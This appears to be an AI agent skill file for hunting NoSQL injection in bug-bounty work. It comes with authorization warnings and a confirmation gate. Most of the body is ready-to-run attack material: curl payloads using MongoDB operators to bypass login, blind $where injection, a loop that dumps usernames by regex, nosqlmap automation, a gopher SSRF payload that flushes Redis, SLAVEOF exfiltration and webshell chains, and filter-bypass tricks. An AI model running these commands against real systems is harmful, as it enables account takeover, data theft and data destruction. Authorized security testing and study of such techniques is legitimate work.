---
name: hunt-nosqli
description: Hunt NoSQL Injection
category: security
risk: offensive
source: https://github.com/elementalsouls/Claude-BugHunter
source_repo: elementalsouls/Claude-BugHunter
source_type: community
date_added: '2026-09-20'
license: MIT
license_source: https://github.com/elementalsouls/Claude-BugHunter/blob/main/LICENSE
compatibility: Requires explicit written authorization for a target scope plus the
  relevant testing tools for this technique. Docs-only; helper scripts and commands
  not bundled.
sources: hackerone_public
report_count: 14
---
> **⚠️ AUTHORIZED USE ONLY**
> This skill is for educational purposes or authorized security assessments only.
> You must have explicit, written permission from the system owner before using this tool.
> Misuse of this tool is illegal and strictly prohibited.

> **Mandatory confirmation gate**
> Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
> 1. Ask the user to state the exact target URL, IP, account, or resource.
> 2. Ask the user to confirm written authorization and the permitted scope.
> 3. Show the exact command(s) and explain their expected effect.
> 4. Wait for explicit confirmation in the current conversation.
>
> Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.

# HUNT-NOSQLI — NoSQL Injection

## Crown Jewel Targets

NoSQL injection is most valuable when it bypasses authentication (Critical) or leaks the entire user collection (High).

**Highest-value chains:**
- **MongoDB auth bypass** — `{"username": {"$gt": ""}, "password": {"$gt": ""}}` logs in as first user in collection (usually admin)
- **$where JS injection** — if $where is enabled: blind injection → data exfil
- **Redis command injection** — via SSRF or direct TCP, SLAVEOF attacker-ip → config write → webshell
- **Elasticsearch injection** — _search endpoint with Groovy script injection (pre-5.0) → RCE

---

## Attack Surface Signals

### URL & Param Patterns
```
/api/users/login         POST with JSON body
/api/search?q=
/api/find?filter=
/api/query?where=
Any endpoint accepting JSON body with username/password
```

### Stack Signals
| Signal | Vector |
|--------|--------|
| MongoDB error messages in response | Operator injection |
| mongoose / monk in JS bundles | ODM patterns |
| X-Powered-By: Express | Node.js + MongoDB common stack |
| CouchDB/_utils UI exposed | Futon/Fauxton admin |
| Redis port 6379 open (via SSRF) | CONFIG SET / SLAVEOF |
| Elasticsearch :9200 open | Script injection |

---

## Step-by-Step Hunting Methodology

### Phase 1 — Auth Bypass (MongoDB)
```bash
# Operator injection in JSON body
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'

# Regex wildcard — match any username
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}'

# ne (not equal) bypass
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$ne": "wrong"}}'

# in array bypass
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$in": ["admin","administrator","root"]}, "password": {"$ne": "x"}}'
```

### Phase 2 — URL Parameter Injection
```bash
# Array notation (Express/PHP-style)
curl "https://$TARGET/api/users?username[$gt]=&password[$gt]="
curl "https://$TARGET/api/search?q[$regex]=.*&q[$options]=i"

# POST form data
curl "https://$TARGET/api/login" \
  --data "username[$gt]=&password[$gt]="
```

### Phase 3 — $where Blind Injection (time-based)
```bash
# Test if $where is enabled (time-based detection, 5s delay)
curl -s -X POST https://$TARGET/api/search \
  -H "Content-Type: application/json" \
  -d '{"q": {"$where": "function(){var d=new Date();while(new Date()-d<5000){}; return true;}"}}'
# If response takes 5+ seconds → $where injection confirmed

# Blind data exfil (username starts with 'a'?)
curl -s -X POST https://$TARGET/api/search \
  -H "Content-Type: application/json" \
  -d '{"q": {"$where": "function(){if(this.username.match(/^a/)){sleep(3000);} return true;}"}}'
```

### Phase 3b — Syntax injection into a concatenated `$where`/query (string context)
When the app concatenates input into a JS `$where` STRING (`"this.name=='"+input+"'"`) instead of accepting an operator object, break the string rather than passing `$gt`/`$ne`. Fuzz first, then break:
```
fuzz:  ' " ` { ; $         # any 500/behaviour change = syntax reaches the query
' || '1'=='1               # always-true (string-context breakout)
' && this.password.match(/^a/) || 'x'=='y   # boolean char-exfil oracle
```
(PortSwigger: Injecting syntax into NoSQL queries.)

### Phase 4 — Data Dump via Regex
```bash
# Enumerate usernames character by character
for c in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
  RESP=$(curl -s -X POST https://$TARGET/api/users \
    -H "Content-Type: application/json" \
    -d "{\"username\": {\"\$regex\": \"^$c\"}}")
  echo "$c: $(echo $RESP | wc -c)"
done
```

### Phase 5 — Automation
```bash
# nosqlmap
pip3 install nosqlmap
nosqlmap -u "https://$TARGET/api/login" --attack 1

# nosqlmap data extraction
nosqlmap -u "https://$TARGET/api/login" --attack 2
```

### Phase 6 — Redis via SSRF
```bash
# If SSRF found, probe internal Redis via gopher://
curl "https://$TARGET/fetch?url=gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aflushall%0d%0a"

# CONFIG SET webshell (if Redis has write access to web root)
# Use SLAVEOF for OOB data exfil
```

---

## Bypass Table

| Defense | Bypass |
|---------|--------|
| JSON.parse rejects objects | Use array: `password[$ne]=x` (URL params) |
| Sanitizes `$` | Unicode: `$gt` |
| Blocks operator keys | Nested objects deeper in structure |

---

## Chain Table

| NoSQLi finding | Chain to | Impact |
|---------------|----------|--------|
| Auth bypass | Admin panel access | Full admin control |
| User enum via regex | Credential stuffing | Mass ATO |
| $where enabled | Arbitrary JS in DB process | Data exfil or DoS |
| Redis via SSRF | CONFIG SET / SLAVEOF | Webshell or data exfil |

---

## Validation

✅ Auth bypass: logged in without valid credentials, received valid session token
✅ Data dump: returned users/documents you shouldn't have access to
✅ Blind injection: confirmed via time-delay (>4 seconds consistent)

**Severity:**
- Auth bypass as admin: Critical
- User collection dump: High
- Blind injection (no useful exfil): Medium

## When to Use

- You have explicit, written authorization to assess the target in scope, and the task matches this skill's vulnerability class or technique within a bug-bounty or penetration-test engagement.
- You need the recon, exploitation, or validation workflow described below — executed strictly inside the approved scope.

## Limitations

- Authorized scope only: the confirmation gate above is mandatory before any probing, exploitation, or credential-access command.
- Docs-only import: upstream helper scripts, commands, engine, and research assets are not bundled; reinstall tooling from the source repo when needed.
- Validate every finding (see `triage-validation`) before reporting; report via `report-writing`. Prefer a sandbox, disposable VM, or controlled lab.

### Example

```bash
# Read-only first step; confirm scope before anything active.
cat scope.txt  # target list from the authorized engagement brief
```

> Adapted from [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter) (MIT); frontmatter, When to Use/Limitations, and safety boundaries added for upstream compliance. Docs-only import: executable helpers, commands, engine, and research assets not bundled.
